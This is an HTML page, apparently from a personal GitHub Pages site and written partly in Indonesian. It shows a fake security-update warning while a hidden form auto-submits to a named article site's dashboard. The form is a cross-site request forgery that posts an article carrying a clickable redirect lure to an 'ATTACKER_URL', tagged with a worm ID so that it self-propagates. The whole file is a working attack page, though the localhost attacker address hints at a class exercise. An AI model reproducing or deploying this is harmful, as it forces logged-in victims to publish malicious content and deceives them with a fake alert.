<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>System Update Required</title>
</head>
<body>
    
    <center style="margin-top: 50px; font-family: sans-serif;">
        <h1 style="color: red;">⚠️ SECURITY ALERT ⚠️</h1>
        <h2>Sedang memperbarui keamanan akun Anda...</h2>
        <p>Jangan tutup halaman ini sampai proses selesai.</p>
        <img src="https://media.tenor.com/On7kvXhzml4AAAAj/loading-gif.gif" alt="Loading" width="50">
    </center>

    <form action="http://artikelku.funshop.id/?page=dashboard" method="POST" enctype="multipart/form-data" id="formJahat">
        <input type="hidden" name="judul" id="judul">
        <input type="hidden" name="kategori_id" value="4">
        <input type="hidden" name="ringkasan" id="ringkasan">
        <input type="hidden" name="isi_artikel" id="isi_artikel">
        <input type="hidden" name="publish" value="Publish">
    </form>

    <script>
        // ========== RANDOM GENERATOR ==========
        function generateRandomString(length = 12) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        const wormId = generateRandomString(8);
        const timestamp = Date.now();
        const ATTACKER_URL = "http://127.0.0.1:5500/hadiah.html";

        // ========== PAYLOAD REKURSIF ==========

        // Title: format <a>Title<a> + random ID
        document.getElementById('judul').value = 
            `<a>URGENT: Security Update #${wormId}<a>`;

        // Ringkasan: H1 PERSIS TANPA PERUBAHAN VISUAL
        // Random ID disembunyikan di HTML comment agar tidak break format
        document.getElementById('ringkasan').value = 
            `<h1 style="color:red; cursor:pointer;" onclick="window.location='${ATTACKER_URL}  '">   KLIK DISINI UNTUK HADIAH! </h1>` +
            `<!-- WORM_ID:${wormId} -->`;

        // Isi artikel: pesan + ID untuk tracking
        document.getElementById('isi_artikel').value = 
            `<p>System vulnerability detected at ${timestamp}.</p>` +
            `<p>Inject ID: ${wormId}</p>` +
            `<p>Salam Hangat dari Edra</p>`;

        // ========== AUTO SUBMIT ==========
        setTimeout(function() {
            document.getElementById('formJahat').submit();
            console.log(`[Worm] Generation ${wormId} deployed`);
        }, 1500);
    </script>

</body>
</html>
# dimsedra.github.io
